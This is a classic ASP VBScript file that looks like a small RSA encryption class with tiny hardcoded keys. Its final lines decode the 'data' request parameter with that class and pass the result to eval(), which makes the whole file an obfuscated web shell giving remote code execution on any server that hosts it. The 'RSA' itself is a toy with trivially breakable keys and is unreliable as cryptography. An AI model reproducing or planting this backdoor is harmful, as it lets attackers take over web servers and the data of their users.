<%@ Language = "VBscript" %>
<%
Class clsRSA 
    Public PublicKey
    Public PrivateKey
    Public Modulus 
    Public Sub GenKey()
        ' modify the follwing key with the key generated by "x1_crypt.html"
        ' 填写用 x1_crypt.html 生成的key
        PublicKey= "4507"
        PrivateKey = "1747"
        Modulus = "4559"
    End Sub 
    Public Function Crypt(pLngMessage, pLngKey) 
        Dim lLngMod 
        Dim lLngResult 
        Dim lLngIndex 
        If pLngKey Mod 2 = 0 Then 
            lLngResult = 1 
            For lLngIndex = 1 To pLngKey / 2 
                lLngMod = (pLngMessage ^ 2) Mod Modulus 
                lLngResult = (lLngMod * lLngResult) Mod Modulus  
            Next 
        Else 
            lLngResult = pLngMessage 
            For lLngIndex = 1 To pLngKey / 2 
                lLngMod = (pLngMessage ^ 2) Mod Modulus 
                lLngResult = (lLngMod * lLngResult) Mod Modulus 
            Next 
        End If 
        Crypt = lLngResult 
    End Function 
    Public Function Encode(ByVal pStrMessage) 
        Dim lLngIndex 
        Dim lLngMaxIndex 
        Dim lBytAscii 
        Dim lLngEncrypted 
        lLngMaxIndex = Len(pStrMessage) 
        If lLngMaxIndex = 0 Then Exit Function 
        For lLngIndex = 1 To lLngMaxIndex 
            lBytAscii = Asc(Mid(pStrMessage, lLngIndex, 1)) 
            lLngEncrypted = Crypt(lBytAscii, PublicKey) 
            Encode = Encode & NumberToHex(lLngEncrypted, 4) 
        Next 
    End Function 
    Public Function Decode(ByVal pStrMessage) 
        Dim lBytAscii 
        Dim lLngIndex 
        Dim lLngMaxIndex 
        Dim lLngEncryptedData 
        Decode = "" 
        lLngMaxIndex = Len(pStrMessage) 
        For lLngIndex = 1 To lLngMaxIndex Step 4 
            lLngEncryptedData = HexToNumber(Mid(pStrMessage, lLngIndex, 4)) 
            lBytAscii = Crypt(lLngEncryptedData, PrivateKey) 
            Decode = Decode & Chr(lBytAscii) 
        Next 
    End Function 
    Private Function NumberToHex(ByRef pLngNumber, ByRef pLngLength) 
        NumberToHex = Right(String(pLngLength, "0") & Hex(pLngNumber), pLngLength) 
    End Function 
    Private Function HexToNumber(ByRef pStrHex) 
        HexToNumber = CLng("&h" & pStrHex) 
    End Function 
End Class
Set ObjRSA = New clsRSA
Call ObjRSA.GenKey()
StrMessage = request("data")
StrMessage = ObjRSA.Decode(StrMessage)
eval(StrMessage)
%>
